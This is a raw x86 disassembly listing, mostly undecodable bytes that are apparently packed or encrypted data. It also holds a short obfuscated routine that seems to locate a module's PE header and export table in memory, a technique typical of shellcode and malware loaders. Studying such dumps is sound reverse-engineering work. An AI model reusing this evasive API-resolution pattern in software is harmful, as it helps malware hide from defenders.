  4195e5:	arpl   WORD PTR [eax-0x6e],si
  4195e8:	ucomiss xmm7,DWORD PTR [edx]
  4195eb:	fnstenv [edx+0x2a]
  4195ee:	in     eax,0xbb
  4195f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195f1:	dec    ecx
  4195f2:	mov    ch,0xb8
  4195f4:	fsubr  st(1),st
  4195f6:	jne    0x4195d0
  4195f8:	jmp    0x507b25aa
  4195fd:	aam    0x5e
  4195ff:	ret    
  419600:	mov    ecx,0xd986700c
  419605:	test   dl,al
  419607:	ja     0x419641
  419609:	jnp    0x41960f
  41960b:	add    eax,0x55209c65
  419610:	pop    esi
  419611:	call   0xee29:0x195ef3a0
  419618:	call   0x49f647d
  41961d:	push   ebp
  41961e:	dec    edi
  41961f:	je     0x419612
  419621:	add    DWORD PTR [edx],edi
  419623:	int3   
  419624:	ja     0x41962c
  419626:	repz popa 
  419628:	jnp    0x419679
  41962a:	sub    DWORD PTR [eax],0x1d8653b8
  419630:	adc    BYTE PTR [ebx+0x58],bl
  419633:	jns    0x419632
  419635:	test   al,0x8e
  419637:	push   cs
  419638:	dec    esp
  419639:	sub    DWORD PTR [ecx-0x63],edi
  41963c:	std    
  41963d:	(bad)  
  41963f:	ds sub ah,al
  419642:	lds    ebx,FWORD PTR ds:0x6e0fb0c1
  419648:	mov    ds:0x2052021f,eax
  41964d:	pop    esp
  41964e:	and    DWORD PTR [eax-0x6e200463],edi
  419654:	jns    0x41969f
  419656:	sub    edx,DWORD PTR [ecx+0x29]
  419659:	gs addr16 loop 0x4195dd
  41965d:	jmp    0x41963b
  41965f:	jbe    0x419640
  419661:	stos   DWORD PTR es:[edi],eax
  419662:	mov    es,WORD PTR [edx+0x6ee68912]
  419668:	xchg   ebx,eax
  419669:	xchg   ebx,eax
  41966a:	shr    DWORD PTR [edi],cl
  41966c:	sbb    BYTE PTR [edx-0x17],0x5f
  419670:	(bad)  
  419671:	stos   DWORD PTR es:[edi],eax
  419672:	push   edx
  419673:	call   0x45daeb4e
  419678:	repnz adc al,0xfa
  41967b:	call   0x6b9e:0xd0ddc55f
  419682:	shl    DWORD PTR [esi-0x33],0xff
  419686:	gs pop ds
  419688:	pop    edx
  419689:	xor    DWORD PTR [eax-0x1f],0xfffffffc
  41968d:	xchg   edi,eax
  41968e:	addr16 dec ecx
  419690:	and    DWORD PTR [edx],ebp
  419692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419693:	fbstp  TBYTE PTR [ebx+0x3cdc8cfc]
  419699:	xor    ecx,edi
  41969b:	test   eax,0xcafab7f2
  4196a0:	mov    DWORD PTR [esi-0x4793b3bd],ebp
  4196a6:	in     al,0xa0
  4196a8:	sub    BYTE PTR [eax-0x75c17818],ch
  4196ae:	cmp    eax,0x78b4447a
  4196b4:	not    DWORD PTR [ebx+0x3b]
  4196b7:	inc    esp
  4196b8:	int3   
  4196b9:	mov    cl,0xf8
  4196bb:	mov    ecx,0xde0b6e45
  4196c0:	push   edi
  4196c1:	sub    DWORD PTR [esi-0x1a],edi
  4196c4:	adc    BYTE PTR [edi],ah
  4196c6:	popf   
  4196c7:	inc    edi
  4196c8:	push   esi
  4196c9:	mov    ds:0x9b3c58e7,al
  4196ce:	sub    BYTE PTR [bp+si+0x7cbd],bh
  4196d3:	xchg   esi,eax
  4196d4:	cmp    DWORD PTR [ecx-0x8],0x24
  4196d8:	push   0x28c1a023
  4196dd:	mov    ecx,0x6e192175
  4196e2:	les    ebx,FWORD PTR [esi-0x13]
  4196e5:	push   es
  4196e6:	ficom  DWORD PTR [eiz*4+0x518a8dea]
  4196ed:	xor    al,0x42
  4196ef:	fild   DWORD PTR [edx-0x3d]
  4196f2:	add    DWORD PTR [eax],esp
  4196f4:	rcl    cl,cl
  4196f6:	sbb    al,BYTE PTR [ecx-0x5352fe22]
  4196fc:	sub    al,0x5e
  4196fe:	fs lock out dx,al
  419701:	push   0x31d83090
  419706:	idiv   BYTE PTR [ebp+0x6738714b]
  41970c:	lock rcr BYTE PTR [edx+esi*4],1
  419710:	pop    edi
  419711:	outs   dx,BYTE PTR ds:[esi]
  419712:	mov    ds:0xeb4c3e1b,eax
  419717:	add    DWORD PTR [ecx],esi
  419719:	jne    0x4196c6
  41971b:	scas   eax,DWORD PTR es:[edi]
  41971c:	jo     0x4196ee
  41971e:	jg     0x419749
  419720:	enter  0xe764,0x52
  419724:	leave  
  419725:	xchg   esp,eax
  419726:	test   DWORD PTR [ecx-0x5d],ebp
  419729:	arpl   sp,cx
  41972b:	stos   DWORD PTR es:[edi],eax
  41972c:	cwde   
  41972d:	jl     0x41973a
  41972f:	xor    DWORD PTR [edi+0x7e0acc15],0xffffffba
  419736:	dec    ebx
  419737:	lods   al,BYTE PTR ds:[esi]
  419738:	xchg   DWORD PTR [ebx-0x305fe0ab],esi
  41973e:	es inc ebp
  419740:	call   0x7bf59565
  419745:	(bad)  
  419746:	cld    
  419747:	and    ch,ch
  419749:	js     0x419751
  41974b:	cld    
  41974c:	sti    
  41974d:	jecxz  0x4196fa
  41974f:	rcr    DWORD PTR [edx-0x15],0x46
  419753:	mov    edi,0xbec0005f
  419758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419759:	ret    
  41975a:	xchg   ebp,eax
  41975b:	xchg   ebx,eax
  41975c:	sbb    BYTE PTR [esi+0x89fdc9b],ch
  419762:	ja     0x419798
  419764:	or     esp,0x682f678
  41976a:	(bad)  
  41976b:	aaa    
  41976c:	div    DWORD PTR [edi-0x39215ef9]
  419772:	sub    al,0x56
  419774:	and    edi,eax
  419776:	(bad)  
  419777:	pop    edx
  419778:	das    
  419779:	pop    ss
  41977a:	les    ebx,FWORD PTR [ebx-0x47]
  41977d:	pop    esp
  41977e:	xor    DWORD PTR [edi],ecx
  419780:	ins    BYTE PTR es:[edi],dx
  419781:	cmp    bh,BYTE PTR [ecx]
  419783:	into   
  419784:	das    
  419785:	clc    
  419786:	or     BYTE PTR [ebp-0x41f93ebe],ah
  41978c:	ins    DWORD PTR es:[edi],dx
  41978d:	(bad)  
  41978e:	fsubr  DWORD PTR [ecx]
  419790:	rcr    BYTE PTR [ebp+0x50c3d6ab],0xbb
  419797:	stc    
  419798:	push   0x10
  41979a:	jbe    0x41974b
  41979c:	cmp    ecx,DWORD PTR [esi-0x65dbf9db]
  4197a2:	cmc    
  4197a3:	scas   eax,DWORD PTR es:[edi]
  4197a4:	aas    
  4197a5:	mov    ah,0xac
  4197a7:	jle    0x41972c
  4197a9:	fdivrp st(0),st
  4197ab:	fmul   st,st(0)
  4197ad:	mov    ch,0xd6
  4197af:	mov    ecx,DWORD PTR [ecx]
  4197b1:	xor    DWORD PTR ds:0x6438022d,ecx
  4197b7:	jp     0x419837
  4197b9:	mov    ebp,0x1f0767b4
  4197be:	nop
  4197bf:	cmp    eax,0x7b2a7f34
  4197c4:	mov    dh,0xa0
  4197c6:	fcomp  DWORD PTR [ecx]
  4197c8:	mov    esi,0xa121aea7
  4197cd:	loopne 0x419849
  4197cf:	inc    edi
  4197d0:	sub    eax,0xa1539fe8
  4197d5:	sbb    eax,0xb055ebc1
  4197da:	cwde   
  4197db:	ins    DWORD PTR es:[edi],dx
  4197dc:	outs   dx,DWORD PTR ds:[esi]
  4197dd:	mov    esi,0x9d1fd52e
  4197e2:	shl    BYTE PTR [edx],0x21
  4197e5:	add    eax,0xf6620ea7
  4197ea:	fwait
  4197eb:	ret    0x886a
  4197ee:	fidivr DWORD PTR [eax+0x47]
  4197f1:	push   esp
  4197f2:	popf   
  4197f3:	pop    eax
  4197f4:	int    0x78
  4197f6:	dec    edi
  4197f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f8:	dec    ebx
  4197f9:	xor    eax,0x1edc27f2
  4197fe:	dec    esi
  4197ff:	jno    0x419781
  419801:	mov    eax,ds:0xbb9bc9ad
  419806:	cmp    esi,DWORD PTR [ebx+0x55]
  419809:	rcl    DWORD PTR [esi+0x6d09f500],cl
  41980f:	das    
  419810:	push   0x5e968101
  419815:	shr    esp,0xe0
  419818:	out    dx,al
  419819:	daa    
  41981a:	jne    0x41987d
  41981c:	nop
  41981d:	dec    edx
  41981e:	cmc    
  41981f:	sub    ebp,DWORD PTR [edi]
  419821:	fdivr  QWORD PTR [edi-0x2b0eea7e]
  419827:	cmp    esi,DWORD PTR [ecx+0x55efcbe2]
  41982d:	in     al,dx
  41982e:	cmp    BYTE PTR [ebx+0x29],0x73
  419832:	loop   0x4197c8
  419834:	repnz cmp eax,0xfe6d0fe5
  41983a:	xor    ecx,DWORD PTR [edx+0x7789f196]
  419840:	push   esi
  419841:	ficom  WORD PTR [esi+edi*8]
  419844:	test   al,0x7a
  419846:	stos   DWORD PTR es:[edi],eax
  419847:	cld    
  419848:	iret   
  419849:	cdq    
  41984a:	test   DWORD PTR [ecx+esi*2+0x19e0d0ba],ebp
  419851:	jmp    0xe7287d9e
  419856:	repz or al,BYTE PTR [ebx]
  419859:	xor    DWORD PTR [edi],0xc47d475f
  41985f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419860:	xchg   esi,eax
  419861:	mov    edi,?
  419863:	and    DWORD PTR [edi+ebp*1-0x531a38e],edi
  41986a:	out    dx,al
  41986b:	push   ss
  41986c:	xchg   esp,eax
  41986d:	inc    edi
  41986e:	scas   eax,DWORD PTR es:[edi]
  41986f:	inc    esi
  419870:	aam    0x2e
  419872:	dec    ecx
  419873:	and    dh,ch
  419875:	sub    bl,BYTE PTR [eax]
  419877:	mov    ecx,0x63b186ca
  41987c:	cmp    edi,DWORD PTR [esi+0xc]
  41987f:	imul   ebp,DWORD PTR [edi],0xb2420059
  419885:	pop    esi
  419886:	jp     0x41988c
  419888:	push   cs
  419889:	sahf   
  41988a:	rol    BYTE PTR [ecx],1
  41988c:	out    0x12,al
  41988e:	ins    BYTE PTR es:[edi],dx
  41988f:	add    al,0x79
  419891:	cmp    cl,BYTE PTR [edi+eiz*1-0x42]
  419895:	retf   0xad0a
  419898:	adc    ecx,DWORD PTR [edi]
  41989a:	push   0xb55f3399
  41989f:	jge    0x419886
  4198a1:	mov    dh,0xda
  4198a3:	call   0xb23a:0xa12eabca
  4198aa:	adc    eax,0x2d7cdf5b
  4198af:	or     BYTE PTR [edi],ch
  4198b1:	sub    DWORD PTR [esi+0x5dce784a],eax
  4198b7:	adc    BYTE PTR [ebp+0x69],bh
  4198ba:	lahf   
  4198bb:	and    eax,DWORD PTR [esi]
  4198bd:	jge    0x41988f
  4198bf:	inc    edx
  4198c0:	xchg   ebp,eax
  4198c1:	je     0x41989a
  4198c3:	sahf   
  4198c4:	scas   al,BYTE PTR es:[edi]
  4198c5:	loopne 0x4198e3
  4198c7:	retf   
  4198c8:	(bad)  
  4198c9:	push   edi
  4198ca:	sbb    ah,BYTE PTR [edi]
  4198cc:	(bad)  
  4198ce:	cmp    al,al
  4198d0:	mov    ah,0xa
  4198d2:	add    dl,BYTE PTR [ebp-0x5bdb506b]
  4198d8:	xchg   ecx,eax
  4198d9:	stos   BYTE PTR es:[edi],al
  4198da:	add    edi,DWORD PTR [ebx-0x272196a0]
  4198e0:	push   ss
  4198e1:	sahf   
  4198e2:	sbb    al,0x95
  4198e4:	or     dl,bh
  4198e6:	pop    ds
  4198e7:	and    BYTE PTR [edi],bh
  4198e9:	fistp  QWORD PTR [ecx-0x7b567ce2]
  4198ef:	ins    DWORD PTR es:[edi],dx
  4198f0:	cmp    ecx,edx
  4198f2:	xchg   ebx,eax
  4198f3:	mov    ebx,0xb86f18d3
  4198f8:	push   0xf75db07d
  4198fd:	mov    ebp,0x828d66fb
  419902:	scas   eax,DWORD PTR es:[edi]
  419903:	inc    esi
  419904:	mov    edx,0xd6ff7792
  419909:	aaa    
  41990a:	cmp    ebx,DWORD PTR [ebx]
  41990c:	push   ss
  41990d:	add    al,0xc2
  41990f:	jno    0x4198be
  419911:	adc    ecx,DWORD PTR [ebx]
  419913:	dec    edx
  419914:	fnstsw WORD PTR [ebx+0x267c78f0]
  41991a:	push   es
  41991b:	test   DWORD PTR [ebx-0x5027c2cf],edi
  419921:	dec    esi
  419922:	out    dx,eax
  419923:	mov    ds:0xbbf55bc2,eax
  419928:	dec    edx
  419929:	ins    BYTE PTR es:[edi],dx
  41992a:	inc    ebp
  41992b:	fwait
  41992c:	pop    edi
  41992d:	clc    
  41992e:	adc    al,0x7e
  419930:	cmp    eax,0x7a936528
  419935:	ds popa 
  419937:	addr16 mov ch,0xc6
  41993a:	lea    ebx,[edi-0x411340d7]
  419940:	mov    eax,0x8897e413
  419945:	pop    ds
  419946:	push   ds
  419947:	div    BYTE PTR [edx+0x7e]
  41994a:	pop    esi
  41994b:	dec    edx
  41994c:	or     BYTE PTR [edx],al
  41994e:	add    eax,0xf0bd939e
  419953:	test   BYTE PTR [esi+0x5943a1fb],dh
  419959:	sbb    al,0x40
  41995b:	or     al,0xf
  41995d:	fistp  WORD PTR [edi+ebp*8]
  419960:	bound  edx,QWORD PTR [ebx-0x12]
  419963:	mov    edi,0x229de07a
  419968:	inc    esp
  419969:	cmp    DWORD PTR [edi+0x20],esp
  41996c:	arpl   WORD PTR [ebx+0x1f],ax
  41996f:	ja     0x419970
  419971:	cmp    al,0xf0
  419973:	push   eax
  419974:	(bad)  
  419975:	lods   al,BYTE PTR ds:[esi]
  419976:	fst    QWORD PTR [edx-0x6d]
  419979:	sub    ah,BYTE PTR [ecx-0x5f2541f1]
  41997f:	mov    ds:0xf117cef9,al
  419984:	jne    0x419931
  419986:	cmp    esi,DWORD PTR [edx]
  419988:	gs or  al,0xff
  41998b:	out    0xfe,eax
  41998d:	mov    WORD PTR [edi-0x17fbaad],ds
  419993:	mov    ecx,0x92c98e35
  419998:	pop    ebx
  419999:	bound  ebp,QWORD PTR [eax+0x3d]
  41999c:	mov    dh,0x4
  41999e:	pop    edx
  41999f:	mov    edx,ebp
  4199a1:	push   es
  4199a2:	lods   al,BYTE PTR ds:[esi]
  4199a3:	inc    ecx
  4199a4:	iret   
  4199a5:	mov    ebx,DWORD PTR [ebp-0x67]
  4199a8:	in     eax,dx
  4199a9:	dec    ebx
  4199aa:	cs call 0x959f:0xe4d5426c
  4199b2:	push   esi
  4199b3:	lock push esi
  4199b5:	mov    eax,0x2407c968
  4199ba:	dec    edx
  4199bb:	sbb    BYTE PTR [ecx],ch
  4199bd:	cmp    al,0xfd
  4199bf:	lods   eax,DWORD PTR ds:[esi]
  4199c0:	retf   0xe811
  4199c3:	pop    ds
  4199c4:	jno    0x419a31
  4199c6:	sub    dh,BYTE PTR [eax+0x75028091]
  4199cc:	mov    ah,BYTE PTR [ecx+edx*1]
  4199cf:	in     al,dx
  4199d0:	aam    0x1f
  4199d2:	stos   DWORD PTR es:[edi],eax
  4199d3:	popa   
  4199d4:	inc    ebx
  4199d5:	pop    edi
  4199d6:	mov    al,0xb
  4199d8:	ficom  WORD PTR [edx+edx*8-0x6f]
  4199dc:	or     DWORD PTR [edi-0x25dd5e24],esp
  4199e2:	pop    ss
  4199e3:	xchg   edx,eax
  4199e4:	out    0xa,al
  4199e6:	in     al,0x99
  4199e8:	mov    eax,0xbd588140
  4199ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ee:	push   edi
  4199ef:	fidivr DWORD PTR [esi]
  4199f1:	jns    0x419988
  4199f3:	jmp    0x419a07
  4199f5:	and    eax,0x365a3ad0
  4199fa:	jmp    FWORD PTR [esi-0x67dcaf70]
  419a00:	cmp    cl,al
  419a02:	retf   0x9e1a
  419a05:	inc    ecx
  419a06:	jb     0x419a2f
  419a08:	cmp    ah,bh
  419a0a:	or     al,0x5d
  419a0c:	add    ebp,ecx
  419a0e:	js     0x4199b5
  419a10:	popf   
  419a11:	out    dx,eax
  419a12:	stos   DWORD PTR es:[edi],eax
  419a13:	fs aad 0x62
  419a16:	inc    ecx
  419a17:	pop    esp
  419a18:	(bad)  
  419a19:	sub    esi,ebp
  419a1b:	jo     0x4199e1
  419a1d:	and    esp,ecx
  419a1f:	pop    edi
  419a20:	sbb    al,0x1a
  419a22:	dec    edi
  419a23:	mov    bh,0xb2
  419a25:	repz cmp ch,BYTE PTR [eax-0x4342f1fe]
  419a2c:	std    
  419a2d:	pop    ebp
  419a2e:	dec    edi
  419a2f:	mov    bl,0x3e
  419a31:	aaa    
  419a32:	add    al,dh
  419a34:	sbb    eax,0x5d2bf690
  419a39:	in     al,dx
  419a3a:	or     eax,0x933648a2
  419a3f:	jmp    0xaf85:0xd045355c
  419a46:	jbe    0x419a96
  419a48:	pop    edi
  419a49:	bound  ebx,QWORD PTR [eax]
  419a4b:	inc    esi
  419a4c:	jg     0x419a3f
  419a4e:	xchg   esi,eax
  419a4f:	out    dx,eax
  419a50:	fs (bad) 
  419a52:	mov    ebx,0x6f59f742
  419a57:	xchg   edi,eax
  419a58:	push   ebx
  419a59:	pop    ebp
  419a5a:	mov    eax,ds:0x997df8c
  419a5f:	cmp    eax,0xeca0a036
  419a64:	stc    
  419a65:	and    DWORD PTR [eax],0x14
  419a68:	or     ah,BYTE PTR [ebx-0x72]
  419a6b:	imul   edi,DWORD PTR [edx-0x773a6137],0x5f
  419a72:	inc    esp
  419a73:	cmp    DWORD PTR [edx-0x20903a7e],eax
  419a79:	jmp    0x39f1288c
  419a7e:	adc    al,0x5a
  419a80:	(bad)  
  419a81:	ror    BYTE PTR [ecx-0x4aaedd74],cl
  419a87:	add    eax,0xadcb0255
  419a8c:	mov    ebx,0xcd741b70
  419a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a92:	test   al,0xef
  419a94:	ret    0x163a
  419a97:	xor    ebx,ebp
  419a99:	xchg   ebp,eax
  419a9a:	enter  0x8a19,0xc5
  419a9e:	mov    al,ds:0x7697642a
  419aa3:	leave  
  419aa4:	jle    0x419b1a
  419aa6:	cmp    al,dl
  419aa8:	int    0x97
  419aaa:	fsub   st,st(3)
  419aac:	nop
  419aad:	into   
  419aae:	ret    
  419aaf:	cs xchg esi,eax
  419ab1:	mov    es,eax
  419ab3:	jnp    0x419a97
  419ab5:	add    al,0x86
  419ab7:	xchg   esp,eax
  419ab8:	fisttp WORD PTR [ecx+0x40]
  419abb:	addr16 mov eax,ds:0xbbe2
  419abf:	xchg   DWORD PTR [ebx+edx*8+0x3222d4d7],edx
  419ac6:	inc    BYTE PTR [esi]
  419ac8:	mov    edi,0x2ba46a19
  419acd:	nop
  419ace:	dec    edi
  419acf:	mov    eax,ds:0x355e8eab
  419ad4:	arpl   cx,si
  419ad6:	inc    ecx
  419ad7:	or     al,BYTE PTR [ebp+0x1a4b5087]
  419add:	jl     0x419afa
  419adf:	mov    eax,0x2f60dbf4
  419ae4:	add    BYTE PTR [ebx+0x1c315b43],bh
  419aea:	mov    ds:0x3209f0c3,eax
  419aef:	xchg   esp,eax
  419af0:	es loope 0x419a9a
  419af3:	cld    
  419af4:	and    ecx,ecx
  419af6:	sbb    ebp,esi
  419af8:	stos   BYTE PTR es:[edi],al
  419af9:	scas   eax,DWORD PTR es:[edi]
  419afa:	xchg   edx,eax
  419afb:	mov    bh,0x45
  419afd:	jnp    0x419b73
  419aff:	push   ss
  419b00:	cmp    DWORD PTR [eax-0x7192b0dc],0x51ffb4b4
  419b0a:	aaa    
  419b0b:	or     DWORD PTR [eax],edi
  419b0d:	icebp  
  419b0e:	xchg   edx,eax
  419b0f:	jo     0x419ab4
  419b11:	pop    DWORD PTR [ecx+0x5e]
  419b14:	pop    edi
  419b15:	xchg   ecx,eax
  419b16:	pop    esp
  419b17:	stos   DWORD PTR es:[edi],eax
  419b18:	daa    
  419b19:	push   ebx
  419b1a:	pop    ds
  419b1b:	fs test al,0x37
  419b1e:	xor    eax,0x6869cfd9
  419b23:	jne    0x419b5b
  419b25:	lea    ecx,[ebp-0x3ea7a492]
  419b2b:	xor    al,0x7f
  419b2d:	adc    al,0x98
  419b2f:	cdq    
  419b30:	mov    cl,0xf7
  419b32:	or     ecx,DWORD PTR [ebp+ebx*2-0x2a28528a]
  419b39:	fnstenv [edx]
  419b3b:	jae    0x419b2e
  419b3d:	sub    DWORD PTR [edi-0x43],ebx
  419b40:	pop    ecx
  419b41:	sub    esi,esp
  419b43:	fs std 
  419b45:	pop    ss
  419b46:	imul   eax,ebp,0x1ccd3400
  419b4c:	ret    0xb0b4
  419b4f:	inc    BYTE PTR [edx]
  419b51:	adc    DWORD PTR [edx],0x767f5bfb
  419b57:	(bad)  gs:[eax-0x6c0e1c45]
  419b5e:	pop    ecx
  419b5f:	aas    
  419b60:	or     BYTE PTR [ebp-0x51],ch
  419b63:	mov    edi,esp
  419b65:	or     BYTE PTR ds:0x9f625efe,bl
  419b6b:	shl    cl,0x7a
  419b6e:	fist   DWORD PTR [bp+si-0x3c]
  419b72:	sub    ebp,DWORD PTR [ebp+0x6441c367]
  419b78:	clc    
  419b79:	in     al,dx
  419b7a:	jnp    0x419ba0
  419b7c:	fdiv   QWORD PTR [edx]
  419b7e:	mov    eax,0x3b8a3201
  419b83:	mov    bl,BYTE PTR [edi+0x79]
  419b86:	dec    edx
  419b87:	dec    ebp
  419b89:	jb     0x419b3e
  419b8b:	sti    
  419b8c:	lahf   
  419b8d:	mov    eax,ds:0x3bb66b3e
  419b92:	jns    0x419b86
  419b94:	icebp  
  419b95:	test   BYTE PTR [ebx+0x5cb86e37],ah
  419b9b:	sub    edx,0xffffffb8
  419b9e:	je     0x419b39
  419ba0:	aad    0x47
  419ba2:	imul   ebp,DWORD PTR [edi+0x0],0xb94d9e0b
  419ba9:	imul   ebp,edx,0x5eff0506
  419baf:	cdq    
  419bb0:	fist   WORD PTR [edx+0x55bd261e]
  419bb6:	jbe    0x419c24
  419bb8:	aam    0x80
  419bba:	push   ebp
  419bbb:	mov    dh,0x63
  419bbd:	sub    ebx,esi
  419bbf:	in     eax,0x42
  419bc1:	rcr    DWORD PTR [ebx+0x2bc20ca1],0x32
  419bc8:	and    ch,bh
  419bca:	jb     0x419bec
  419bcc:	gs enter 0xf929,0x9d
  419bd1:	ret    
  419bd2:	mov    esp,ebp
  419bd4:	jge    0x419ba3
  419bd6:	jb     0x419bf0
  419bd8:	scas   al,BYTE PTR es:[edi]
  419bd9:	das    
  419bda:	lods   al,BYTE PTR ds:[esi]
  419bdb:	dec    ecx
  419bdc:	shl    DWORD PTR [ecx],cl
  419bde:	or     ecx,DWORD PTR [esi+0x6f]
  419be1:	jp     0x9a16b56d
  419be7:	dec    edx
  419be8:	dec    edx
  419be9:	cld    
  419bea:	(bad)  
  419bec:	cmp    BYTE PTR [esi],ah
  419bee:	rol    eax,1
  419bf0:	jnp    0x419c19
  419bf2:	aad    0xd8
  419bf4:	pop    esp
  419bf5:	aam    0x20
  419bf7:	xchg   edx,eax
  419bf8:	gs adc ch,bh
  419bfb:	dec    edx
  419bfc:	cdq    
  419bfd:	nop
  419bfe:	fisttp QWORD PTR [eax-0x24b302fc]
  419c04:	mov    DWORD PTR [edi+edx*1],0xf5f45962
  419c0b:	xlat   BYTE PTR ds:[ebx]
  419c0c:	mov    eax,ds:0x39234553
  419c11:	inc    esp
  419c12:	or     BYTE PTR ds:[edi-0x2f],dl
  419c16:	popa   
  419c17:	mov    cl,bh
  419c19:	mov    BYTE PTR fs:[eax-0x38e2f9f],dl
  419c20:	dec    edx
  419c21:	test   ecx,ebp
  419c23:	sbb    eax,0x77daf62
  419c28:	out    0xd5,al
  419c2a:	push   es
  419c2b:	jmp    0x20c0:0xb4e0
  419c31:	and    BYTE PTR [ebx],ah
  419c33:	jb     0x419c82
  419c35:	fmul   st(7),st
  419c37:	jle    0x419c0c
  419c39:	dec    ebx
  419c3a:	js     0x419c88
  419c3c:	push   ss
  419c3d:	pop    ds
  419c3e:	sbb    eax,0x44e17c40
  419c43:	jge    0x419c16
  419c45:	(bad)  
  419c46:	imul   dl
  419c48:	mov    edx,0x63bdb3c1
  419c4d:	xor    dh,BYTE PTR [eax+0x5a]
  419c50:	(bad)  
  419c51:	jbe    0x419bdc
  419c53:	mov    ecx,cr5
  419c56:	jle    0x419c98
  419c58:	std    
  419c59:	cdq    
  419c5a:	xchg   ecx,eax
  419c5b:	vpmulhuw xmm3,xmm4,XMMWORD PTR [esi+0x65]
  419c60:	scas   al,BYTE PTR es:[edi]
  419c61:	aam    0xb5
  419c63:	sbb    BYTE PTR [edi],al
  419c65:	cdq    
  419c66:	inc    edi
  419c67:	push   edi
  419c68:	int    0xaa
  419c6a:	jo     0x419c65
  419c6c:	mov    ds:0x457b831b,al
  419c71:	and    eax,0x7766e3f9
  419c76:	mov    ebp,0x40ccc8cd
  419c7b:	ja     0x419c9c
  419c7d:	aad    0xa4
  419c7f:	sub    ch,ch
  419c81:	xchg   esp,eax
  419c82:	pop    esi
  419c83:	push   ebp
  419c84:	mov    ecx,0x969ee3e2
  419c89:	xor    eax,DWORD PTR [edx-0x30]
  419c8c:	xchg   ebx,eax
  419c8d:	ins    BYTE PTR es:[edi],dx
  419c8e:	jnp    0x419c2f
  419c90:	imul   edx,edx,0xa8dc6f33
  419c96:	jmp    0x419c52
  419c98:	fmul   QWORD PTR [eax+0x58]
  419c9b:	xchg   BYTE PTR [edx-0x5bb1f0a3],cl
  419ca1:	imul   edx,DWORD PTR [edi+0x2c],0x4f5ceef0
  419ca8:	clc    
  419ca9:	fistp  WORD PTR [edx+0x7]
  419cac:	out    dx,eax
  419cad:	aas    
  419cae:	retf   0xa432
  419cb1:	rcl    BYTE PTR [eax],0x87
  419cb4:	adc    ebx,edi
  419cb6:	enter  0x9d0e,0xea
  419cba:	iret   
  419cbb:	out    0x26,eax
  419cbd:	sahf   
  419cbe:	dec    eax
  419cbf:	cs pop es
  419cc1:	mov    esp,0xdb1d8991
  419cc6:	mov    WORD PTR [edi-0x4a9e292b],es
  419ccc:	or     al,0x75
  419cce:	inc    edi
  419ccf:	push   esi
  419cd0:	shl    DWORD PTR [esi],1
  419cd2:	ins    BYTE PTR es:[edi],dx
  419cd3:	xor    ah,BYTE PTR [edi]
  419cd5:	jnp    0x419d1e
  419cd7:	mov    BYTE PTR [edx],0xba
  419cda:	hlt    
  419cdb:	icebp  
  419cdc:	push   cs
  419cdd:	mov    edx,0x4566653
  419ce2:	repnz lods eax,DWORD PTR ds:[esi]
  419ce4:	fsubrp st(5),st
  419ce6:	push   es
  419ce7:	xchg   ecx,eax
  419ce8:	mov    esi,0x8bc7b9d7
  419ced:	pop    ebp
  419cee:	fmul   DWORD PTR [ebx-0x39dc2383]
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	iret   
  419d84:	or     ch,bl
  419d86:	or     esi,ebp
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0x6cbd192c
  419d90:	dec    esi
  419d91:	push   0xcf64b988
  419d96:	sub    edx,DWORD PTR [ebx+0x75b0b050]
  419d9c:	jmp    0x419d67
  419d9e:	sub    DWORD PTR [esi],ecx
  419da0:	repz xor eax,0x714b4377
  419da6:	arpl   WORD PTR [ebx-0x6e1c02a1],si
  419dac:	pxor   mm2,QWORD PTR [ebp-0x58471ef]
  419db3:	inc    edi
  419db4:	mov    ebp,0x6ebe9f1a
  419db9:	test   eax,0x5ba8b6be
  419dbe:	cmp    ah,bl
  419dc0:	xchg   ecx,eax
  419dc1:	stc    
  419dc2:	dec    esp
  419dc3:	ret    
  419dc4:	xchg   ecx,eax
  419dc5:	sbb    eax,ecx
  419dc7:	and    DWORD PTR [ecx+0x757a8e3b],esp
  419dcd:	push   esi
  419dce:	or     DWORD PTR [eax+ecx*8],edi
  419dd1:	adc    edi,ebx
  419dd3:	stos   BYTE PTR es:[edi],al
  419dd4:	jb     0x419e3a
  419dd6:	mov    ecx,0xe0de58de
  419ddb:	jb     0x419daa
  419ddd:	jmp    0xe25f:0xb0e11863
  419de4:	je     0x419e2b
  419de6:	inc    ebx
  419de7:	push   esp
  419de8:	lahf   
  419de9:	xor    eax,0xb0754be6
  419dee:	(bad)  
  419df0:	jae    0x419d87
  419df2:	stc    
